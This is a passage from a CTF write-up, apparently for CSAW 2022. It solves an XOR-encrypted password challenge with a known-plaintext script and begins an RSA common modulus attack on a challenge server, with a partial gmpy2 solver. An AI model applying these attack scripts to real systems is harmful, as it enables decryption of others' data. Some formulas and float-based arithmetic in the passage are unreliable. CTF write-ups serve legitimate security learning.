&lt;&#x2F;span&gt;&lt;span&gt;		tmp &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;chr&lt;&#x2F;span&gt;&lt;span&gt;(y &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;^ &lt;&#x2F;span&gt;&lt;span&gt;l)
&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(tmp)
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;The output is&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#fafafa;color:#61676c;&quot;&gt;&lt;code&gt;&lt;span&gt;Chespin-Grass                                                                                                                                                        
&lt;&#x2F;span&gt;&lt;span&gt;Mr. Mime-Psychic-Fa                                                                                                                                                  
&lt;&#x2F;span&gt;&lt;span&gt;Tornadus-Flying                                                                                                                                                      
&lt;&#x2F;span&gt;&lt;span&gt;Pupitar-Rock-Ground                                                                                                                                                  
&lt;&#x2F;span&gt;&lt;span&gt;Combusken-Fire-Figh                                                                                                                                                  
&lt;&#x2F;span&gt;&lt;span&gt;Guzzlord-Dark-Drago                                                                                                                                                  
&lt;&#x2F;span&gt;&lt;span&gt;Carnivine-Grass                                                                                                                                                      
&lt;&#x2F;span&gt;&lt;span&gt;Growlithe-Fire                                                                                                                                                       
&lt;&#x2F;span&gt;&lt;span&gt;Grubbin-Bug                                                                                                                                                          
&lt;&#x2F;span&gt;&lt;span&gt;Gastrodon-Water-Gro                                                                                                                                                  
&lt;&#x2F;span&gt;&lt;span&gt;Goomy-Dragon                                                                                                                                                         
&lt;&#x2F;span&gt;&lt;span&gt;Thievul-Dark                                                                                                                                                         
&lt;&#x2F;span&gt;&lt;span&gt;1n53cu2357234mc1ph3                                                                                                                                                  
&lt;&#x2F;span&gt;&lt;span&gt;Seadra-Water 
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;As we can see the last but one row has the flag but its not a complete flag. To find the full flag we have to find the key which is longer than the current one for that we can take the any decrypted password which is longer than the leaked password, then we can repeat the above process to get the complete flag.&lt;&#x2F;p&gt;
&lt;p&gt;I am taking &lt;code&gt;Gastrodon-Water-Ground-Steel&lt;&#x2F;code&gt; for now,&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;pwn &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;xor
&lt;&#x2F;span&gt;&lt;span&gt;f &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;open&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;encrypted_passwords.txt&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;rb&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;l &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Gastrodon-Water-Ground-Steel&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;c &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;b&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;oz&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\xd6\xb9\xde&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;Y&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\x7f\xc1\xc9\xf4\xc5\x9d\xb9&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;y&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\xb1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;j&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\xe9\xdd&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;`&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\xe0\xe2\xdf&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;
&lt;&#x2F;span&gt;&lt;span&gt;key &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;xor&lt;&#x2F;span&gt;&lt;span&gt;(c&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt;l)
&lt;&#x2F;span&gt;&lt;span&gt;lines &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;f&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;readlines&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;i &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span&gt;lines:
&lt;&#x2F;span&gt;&lt;span&gt;	i &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;i&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;strip&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span&gt;	tmp &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;&amp;#39;
&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;y&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt;l &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;zip&lt;&#x2F;span&gt;&lt;span&gt;(key&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt;i):
&lt;&#x2F;span&gt;&lt;span&gt;		tmp &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;chr&lt;&#x2F;span&gt;&lt;span&gt;(y &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;^ &lt;&#x2F;span&gt;&lt;span&gt;l)
&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(tmp)
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Wooooooh! we got it...&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;The flag is 1n53cu2357234mc1ph32&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;hr &#x2F;&gt;
&lt;h1 id=&quot;phi-in-too-much-common&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#phi-in-too-much-common&quot; aria-label=&quot;Anchor link for: phi-in-too-much-common&quot;&gt;Phi in Too Much Common&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;Here it is the Chall which takes 5 hours of my life. But at the end it boosted my confidence levels upto the sky.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;csaw22&#x2F;phi.png&quot; alt=&quot;phi_in_too_much_common&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;First i connected to the challenge with the netcat.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span&gt; nc crypto.chal.csaw.io 5000
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;**********&lt;&#x2F;span&gt;&lt;span&gt;   TOO MUCH IN COMMON      &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;**********
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Have&lt;&#x2F;span&gt;&lt;span&gt; at it!
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;&#x2F;------------------------------&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;\
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;|           &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;COMMANDS              &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;|
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;|                                 |
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;|   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;ciphertext_info            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;|
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;|   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;solve_challenge &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span&gt;password&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;gt; |
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;|   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;3&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;exit                       &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;|
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;-----------------------------&#x2F;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;gt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;N&lt;&#x2F;span&gt;&lt;span&gt; = 66230379529365020257079274492974065493126330971013187062230550667484536336498921190934189244362957312249586769969174687366278892047021464836842536529323843984917711253546999262427337059964746457287003004612989077687496386808318868155443955433495669933416861831960406309846051654977485404679018836950591207073
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;e&lt;&#x2F;span&gt;&lt;span&gt; = 3203033219058218846809870595889303749356759660802874921757919347285050689023
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;c&lt;&#x2F;span&gt;&lt;span&gt; = 16602634789029238804962653840385596228672793718393061759190379436477434589539439401344810124749337507914027486814367920958698864422367836842000865838169143446244202199945258912479805482529460471614475452210103481314126501905118652422131330354981855680471366776223771244856426005553912820240798175126871245542
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt; &#x2F;------------------------------&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;\
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;|           &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;COMMANDS              &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;|
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;|                                 |
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;|   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;ciphertext_info            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;|
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;|   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;solve_challenge &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span&gt;password&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;gt; |
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;|   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;3&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;exit                       &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;|
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;-----------------------------&#x2F;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;gt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;N&lt;&#x2F;span&gt;&lt;span&gt; = 97158515552243305887166842257349497196761944723849796333314570210192465467248058977973817520811466238434579242618470413011446370885671769783517122178886737136267378478851110781637707375501871752419723352747812903232025026662684439394479235396634760931569159089432041476376506570454407306279469567609447874133
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;e&lt;&#x2F;span&gt;&lt;span&gt; = 18408112354007983870269760119469358714794425138855862698209283717095203251527
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;c&lt;&#x2F;span&gt;&lt;span&gt; = 40597559051967819648988812970676624339815299554173974340185756834851649772498697096416499057158638069790189014561709885506503658509085168258788719816632907655273832559720389170846504255470221971178328064025401908633312901398161846240306537659732243916190526957713561623469784228736357566604931785270598213207
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;When i choose option 1 multiple times the N, e and c values are changing. When i observed carefully the modulus(N) was common for the two different groups of N, e and c. Which means the common modulus attack can be performed on it.&lt;&#x2F;p&gt;
&lt;h4 id=&quot;what-is-common-modulus-attack&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#what-is-common-modulus-attack&quot; aria-label=&quot;Anchor link for: what-is-common-modulus-attack&quot;&gt;What is common modulus attack?&lt;&#x2F;a&gt;&lt;&#x2F;h4&gt;
&lt;p&gt;A Common Modulus attack can be used to recover the plaintext when the same message is encrypted to two RSA keys that use the same modulus.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;c1&lt;&#x2F;span&gt;&lt;span&gt; = m^e1 % N
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;c2&lt;&#x2F;span&gt;&lt;span&gt; = m^e2 % N
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Assume that we find out &lt;code&gt;a&lt;&#x2F;code&gt; and &lt;code&gt;b&lt;&#x2F;code&gt; such that &lt;code&gt;(e1 * a) + (e2 * b) = 1&lt;&#x2F;code&gt; then we can decode the plain text as &lt;code&gt;(c1 ^ a) + (c2 ^ b)&lt;&#x2F;code&gt;. If we substitute how &lt;code&gt;c1&lt;&#x2F;code&gt; and &lt;code&gt;c2&lt;&#x2F;code&gt; is calculated to above equation, we can get &lt;code&gt;m^(e1 * a + e2 * b) = m^1 = m&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;p&gt;I used the below script to perform common modulus attack.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;gmpy2
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;codecs
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;Crypto&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;Util&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;number &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;long_to_bytes
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;class &lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;RSAModuli&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;__init__&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;):
&lt;&#x2F;span&gt;&lt;span&gt;       &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;a &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0
&lt;&#x2F;span&gt;&lt;span&gt;       &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;b &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0
&lt;&#x2F;span&gt;&lt;span&gt;       &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;m &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0
&lt;&#x2F;span&gt;&lt;span&gt;       &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;i &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0
&lt;&#x2F;span&gt;&lt;span&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;gcd&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;num1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;num2&lt;&#x2F;span&gt;&lt;span&gt;):
&lt;&#x2F;span&gt;&lt;span&gt;       &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;num1 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;lt; &lt;&#x2F;span&gt;&lt;span&gt;num2:
&lt;&#x2F;span&gt;&lt;span&gt;           num1, num2 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;num2, num1
&lt;&#x2F;span&gt;&lt;span&gt;       &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;while &lt;&#x2F;span&gt;&lt;span&gt;num2 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;!= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;           num1, num2 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;num2, num1 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;% &lt;&#x2F;span&gt;&lt;span&gt;num2
&lt;&#x2F;span&gt;&lt;span&gt;       &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span&gt;num1
&lt;&#x2F;span&gt;&lt;span&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;extended_euclidean&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;e1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;e2&lt;&#x2F;span&gt;&lt;span&gt;):
&lt;&#x2F;span&gt;&lt;span&gt;       &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;a &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;gmpy2&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;invert&lt;&#x2F;span&gt;&lt;span&gt;(e1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;e2)
&lt;&#x2F;span&gt;&lt;span&gt;       &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;b &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;float&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;gcd&lt;&#x2F;span&gt;&lt;span&gt;(e1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;e2)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;a&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span&gt;e1)))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;float&lt;&#x2F;span&gt;&lt;span&gt;(e2)
&lt;&#x2F;span&gt;&lt;span&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;modular_inverse&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;c1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;c2&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;N&lt;&#x2F;span&gt;&lt;span&gt;):
&lt;&#x2F;span&gt;&lt;span&gt;       i &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;gmpy2&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;invert&lt;&#x2F;span&gt;&lt;span&gt;(c2&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;N)
